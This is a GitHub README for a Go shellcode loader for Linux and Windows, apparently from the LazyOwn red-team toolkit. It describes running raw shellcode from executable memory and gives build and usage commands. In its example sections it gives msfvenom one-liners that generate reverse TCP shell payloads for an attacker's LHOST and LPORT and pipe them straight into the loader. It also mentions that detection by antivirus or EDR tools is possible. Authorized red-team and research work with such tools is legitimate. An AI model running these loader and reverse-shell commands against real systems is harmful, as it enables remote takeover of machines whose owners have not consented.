# gomulti_loader
<img width="1024" height="1024" alt="image" src="https://github.com/user-attachments/assets/caaffac1-93f1-4771-9a92-ca33c2191255" />

go run . -shellcode shellcode_linux.txt 

## Multi-Platform Shellcode Loader

<img width="1721" height="493" alt="image" src="https://github.com/user-attachments/assets/88face9b-164a-49ca-b7f4-5c68130362d7" />

## Language: Go (with CGO)

<img width="311" height="162" alt="image" src="https://github.com/user-attachments/assets/53798223-71ec-4f3e-9a30-1969a59d9bfb" />

## Platforms: Linux & Windows (64-bit)

<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/f8ef6719-fdb1-47e8-b0cb-080e8ee5e2d0" />

# Overview

<img width="998" height="825" alt="image" src="https://github.com/user-attachments/assets/d643596a-e879-488a-9f89-ace1ecd11581" />

This project is a multi-platform shellcode loader written in Go using CGO to interface with native system calls. It supports both Linux and Windows operating systems and can execute raw shellcode from a file formatted with \x## byte notation (e.g., \x48\x31\xc0).

The loader reads shellcode from a text file, allocates executable memory, copies the shellcode into that memory, and executes it.

<img width="1019" height="885" alt="image" src="https://github.com/user-attachments/assets/3a04d6f1-f0e2-49d4-84d1-44fcdb6b68d4" />


# Features
- ✅ Cross-platform support:
- Linux: Uses mmap() for executable memory allocation.
- Windows: Uses VirtualAlloc() with PAGE_EXECUTE_READWRITE.
- 📂 Flexible input: Parses shellcode in \x## format from plaintext files.
- 🔧 Simple CLI interface: Accepts path to shellcode file via command-line flag.
- ⚙️ Build automation: Makefile-style build instructions included for both platforms.


## Supported Architectures
- amd64 (x86_64) only
- OS: Linux or Windows
 
## Build Instructions

<img width="631" height="793" alt="image" src="https://github.com/user-attachments/assets/e638ec50-5216-4c88-a5ef-4e083086eace" />


🔹 For Linux:
```bash
GOOS=linux GOARCH=amd64 go build -o loader_linux
```

<img width="1264" height="860" alt="image" src="https://github.com/user-attachments/assets/d9f5dd55-5099-46ab-8aa4-c1a1fee8bb9a" />


🔹 For Windows:
Ensure you have mingw-w64 installed (e.g., x86_64-w64-mingw32-gcc):

```bash
GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -o loader_windows.exe
```

<img width="1302" height="881" alt="image" src="https://github.com/user-attachments/assets/67619400-88ff-4481-966e-6d15aa53e5f7" />


💡 Note: CGO is required for Windows due to use of kernel32.dll functions. 

🧹 Clean Build Artifacts:
```bash
rm -f loader_linux loader_windows.exe
```
Usage
```bash
# On Linux
./loader_linux -shellcode /path/to/shellcode.txt

# On Windows
loader_windows.exe -shellcode C:\path\to\shellcode.txt
```
Example Shellcode File Format:
```text
\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05...
```
Any text file containing shellcode in \x## format is supported. The parser extracts all valid \x## sequences regardless of formatting or line breaks. 

<img width="616" height="725" alt="image" src="https://github.com/user-attachments/assets/0d2856a6-61c8-4b43-bad0-fff6146764af" />


How It Works
Reads the shellcode file.
Parses all \x## hex byte values into a byte array.
Allocates executable memory using OS-specific APIs:
Linux → mmap()
Windows → VirtualAlloc()
Copies shellcode into allocated memory.
Executes the shellcode by calling it as a function.
⚠️ Warning: This tool is intended for educational, research, or authorized security testing purposes only. 

<img width="572" height="878" alt="image" src="https://github.com/user-attachments/assets/505020b5-18ce-4e3a-9a22-c52a3d12e501" />


## Example Shellcode Included
Two example payloads are embedded in the source:

## Linux
- Linux (64-bit): Reverse TCP shell (connects to IP:port)
  
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c -o shellcode_test.txt ; ./loader_linux -shellcode shellcode_test.txt
```

<img width="285" height="888" alt="image" src="https://github.com/user-attachments/assets/bac5a0bc-5996-4087-8eb8-1c82838140ef" />

## Windows  
- Windows (64-bit): Reflective DLL injection / reverse meterpreter-style payload (via ws2_32.dll and cmd execution)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c -o shellcode_test.txt ; powershell .\loader_windows -shellcode shellcode_test.txt
```


<img width="277" height="884" alt="image" src="https://github.com/user-attachments/assets/e9d52229-e3fc-4da7-afa2-73189736a5a9" />


These are provided for testing and demonstration.

# External Framework Integration
## Relevant source files
Purpose and Scope
This document covers how gomulti_loader integrates with external exploitation frameworks and automation systems. The integration system allows external tools to automatically configure, build, and execute the shellcode loader with dynamically generated payloads. This capability enables gomulti_loader to function as a component within larger penetration testing suites and automated exploitation frameworks.

For information about the core shellcode loading functionality, see Core Shellcode Loader System. For details about the build system that supports framework integration, see Build System.

## Framework Integration Architecture
The external framework integration system uses a YAML-based configuration approach that defines how external tools can interact with gomulti_loader. The integration supports parameter-driven payload generation and automated execution workflows.

<img width="536" height="507" alt="image" src="https://github.com/user-attachments/assets/33cc0e47-d7b5-4f66-99c7-1e8f62e9d093" />


## Security Notes
This program requires no external dependencies beyond standard system libraries.
The use of mmap and VirtualAlloc with EXECUTE permissions may trigger AV/EDR detection.
Shellcode must be properly encoded and null-free depending on delivery context.

## Author

👤 grisuno
Security Researcher & LazyOwn Red Team Developer

# Disclaimer
📌 This tool is designed for educational and ethical use only. Unauthorized use of this software to exploit systems without permission is illegal and unethical. The authors assumes no liability for misuse.

📌 This library was made for academic purposes only. The authors are not responsible for what is given to this library and therefore we are exempt from any liability arising from the misuse of it.

Use responsibly and in compliance with all applicable laws and regulations.

# License

**GPLV3**

## Key License Terms
The GPL v3 license provides the following fundamental freedoms as outlined in 

- Freedom to distribute copies of free software
- Freedom to receive source code or obtain it on request
- Freedom to change the software or use pieces in new programs
- Freedom to know these rights are guaranteed

# Links

-    [+] Deepwiki: https://deepwiki.com/grisuno/gomulti_loader/1-overview
-    [+] Github: https://github.com/grisuno/LazyOwn
-    [+] Web: https://grisuno.github.io/LazyOwn/
-    [+] Reddit: https://www.reddit.com/r/LazyOwn/
-    [+] Facebook: https://web.facebook.com/profile.php?id=61560596232150
-    [+] HackTheBox: https://app.hackthebox.com/teams/overview/6429 
-    [+] Grisun0: https://app.hackthebox.com/users/1998024
-    [+] Patreon: https://patreon.com/LazyOwn 
-    [↙] Download: https://github.com/grisuno/LazyOwn/archive/refs/tags/release/0.2.47.tar.gz 


![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) ![Flask](https://img.shields.io/badge/flask-%23000.svg?style=for-the-badge&logo=flask&logoColor=white) [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)
